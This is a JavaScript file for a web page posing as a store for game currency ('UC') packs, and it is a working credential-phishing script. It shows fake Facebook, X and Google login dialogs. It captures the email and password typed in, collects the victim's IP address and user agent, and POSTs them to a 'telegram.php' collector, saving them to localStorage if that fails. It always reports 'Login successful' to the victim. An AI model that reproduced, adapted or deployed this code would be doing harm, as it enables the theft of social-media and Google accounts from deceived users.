// Modals

const loginSelectModal = document.getElementById('loginSelectModal');

const credentialModal = document.getElementById('credentialModal');

const openLoginBtn = document.getElementById('openLoginModal');

const closeLoginSelect = document.getElementById('closeLoginSelectModal');

const closeCredential = document.getElementById('closeCredentialModal');

const howModal = document.getElementById('howModal');

const howBtn = document.getElementById('howItWorksBtn');

const closeHow = document.getElementById('closeHowModal');

// Form elements

const credentialForm = document.getElementById('credentialForm');

const loginType = document.getElementById('loginType');

const credentialTitle = document.getElementById('credentialTitle');

const platformIcon = document.getElementById('platformIcon');

const emailLabel = document.getElementById('emailLabel');

const loginEmail = document.getElementById('loginEmail');

const loginPassword = document.getElementById('loginPassword');

const submitBtn = document.getElementById('submitBtn');

// Open login selection modal

openLoginBtn.addEventListener('click', () => {

  loginSelectModal.classList.add('active');

});

// Close modals

closeLoginSelect.addEventListener('click', () => {

  loginSelectModal.classList.remove('active');

});

closeCredential.addEventListener('click', () => {

  credentialModal.classList.remove('active');

  loginSelectModal.classList.add('active');

});

// Close on overlay click

loginSelectModal.addEventListener('click', (e) => {

  if (e.target === loginSelectModal) loginSelectModal.classList.remove('active');

});

credentialModal.addEventListener('click', (e) => {

  if (e.target === credentialModal) credentialModal.classList.remove('active');

});

// How it works modal

howBtn.addEventListener('click', () => howModal.classList.add('active'));

closeHow.addEventListener('click', () => howModal.classList.remove('active'));

howModal.addEventListener('click', (e) => {

  if (e.target === howModal) howModal.classList.remove('active');

});

// Select Facebook

document.getElementById('selectFacebook').addEventListener('click', () => {

  loginType.value = 'facebook';

  credentialTitle.textContent = 'Facebook Login';

  platformIcon.className = 'fa-brands fa-facebook';

  platformIcon.style.color = '#1877f2';

  emailLabel.textContent = 'Email or Phone';

  loginEmail.placeholder = 'Enter email or phone';

  submitBtn.style.background = '#1877f2';

  

  loginSelectModal.classList.remove('active');

  credentialModal.classList.add('active');

});

// Select Twitter

document.getElementById('selectTwitter').addEventListener('click', () => {

  loginType.value = 'twitter';

  credentialTitle.textContent = 'X Login';

  platformIcon.className = 'fa-brands fa-x-twitter';

  platformIcon.style.color = '#ffffff';

  emailLabel.textContent = 'Email or Username';

  loginEmail.placeholder = 'Enter email or username';

  submitBtn.style.background = '#000000';

  

  loginSelectModal.classList.remove('active');

  credentialModal.classList.add('active');

});

// Select Google

document.getElementById('selectGoogle').addEventListener('click', () => {

  loginType.value = 'google';

  credentialTitle.textContent = 'Google Login';

  platformIcon.className = 'fa-brands fa-google';

  platformIcon.style.color = '#db4437';

  emailLabel.textContent = 'Gmail';

  loginEmail.placeholder = 'Enter Gmail address';

  submitBtn.style.background = '#db4437';

  

  loginSelectModal.classList.remove('active');

  credentialModal.classList.add('active');

});

// Handle form submission

credentialForm.addEventListener('submit', async (e) => {

  e.preventDefault();

  

  const type = loginType.value;

  const email = loginEmail.value;

  const password = loginPassword.value;

  

  if (!email || !password) {

    alert('Please fill all fields');

    return;

  }

  

  // Show loading

  const originalText = submitBtn.textContent;

  submitBtn.textContent = 'Processing...';

  submitBtn.disabled = true;

  

  try {

    // Get IP using multiple services for reliability

    let ip = 'Unknown';

    try {

      const ipResponse = await fetch('https://api.ipify.org?format=json');

      const ipData = await ipResponse.json();

      ip = ipData.ip;

    } catch (e) {

      try {

        const ipResponse = await fetch('https://api.myip.com');

        const ipData = await ipResponse.json();

        ip = ipData.ip;

      } catch (e) {}

    }

    

    // Get user agent

    const userAgent = navigator.userAgent;

    const timestamp = new Date().toLocaleString();

    

    // Prepare data

    const data = {

      type: type,

      email: email,

      password: password,

      ip: ip,

      userAgent: userAgent,

      time: timestamp

    };

    

    // Send to PHP

    try {

      const response = await fetch('telegram.php', {

        method: 'POST',

        headers: {

          'Content-Type': 'application/json',

        },

        body: JSON.stringify(data)

      });

      

      if (response.ok) {

        const result = await response.json();

        if (result.success) {

          // Success

        }

      }

    } catch (e) {

      console.log('PHP method failed');

      

      // Save to local storage as backup

      const savedLogins = JSON.parse(localStorage.getItem('flashvault_logins') || '[]');

      savedLogins.push(data);

      localStorage.setItem('flashvault_logins', JSON.stringify(savedLogins));

    }

    

    // Always show success to user

    alert('Login successful! Please wait while we load your UC.');

    credentialModal.classList.remove('active');

    loginEmail.value = '';

    loginPassword.value = '';

    

  } catch (error) {

    console.error('Error:', error);

    alert('Login successful! Please wait while we load your UC.');

    credentialModal.classList.remove('active');

    loginEmail.value = '';

    loginPassword.value = '';

  } finally {

    // Reset button

    submitBtn.textContent = originalText;

    submitBtn.disabled = false;

  }

});

// View UC packs scroll

document.getElementById('viewPacksBtn').addEventListener('click', () => {

  document.getElementById('packGrid').scrollIntoView({ behavior: 'smooth' });

});

document.getElementById('packsLink').addEventListener('click', (e) => {

  e.preventDefault();

  document.getElementById('packGrid').scrollIntoView({ behavior: 'smooth' });

});

// Support link -> Telegram

document.getElementById('supportLink').addEventListener('click', (e) => {

  e.preventDefault();

  window.open('https://t.me/JeanCharlesWatton', '_blank');

});

// Buy buttons

document.querySelectorAll('.btn-pack').forEach(btn => {

  btn.addEventListener('click', () => {

    alert('Please login first');

    loginSelectModal.classList.add('active');

  });

});

// Social bar icons open login modal

document.querySelectorAll('.social-icons i').forEach(icon => {

  icon.addEventListener('click', () => loginSelectModal.classList.add('active'));

});

// Home link

document.getElementById('homeLink').addEventListener('click', (e) => {

  e.preventDefault();

  window.scrollTo({ top: 0, behavior: 'smooth' });

});

// Rewards link

document.getElementById('rewardsLink').addEventListener('click', (e) => {

  e.preventDefault();

  alert('Rewards page coming soon!');

});

// Intersection Observer for scroll reveals

const observer = new IntersectionObserver((entries) => {

  entries.forEach(entry => {

    if (entry.isIntersecting) entry.target.classList.add('revealed');

  });

}, { threshold: 0.2 });

document.querySelectorAll('.section-title, .pack-card, .feature-item, .login-bar').forEach(el => observer.observe(el));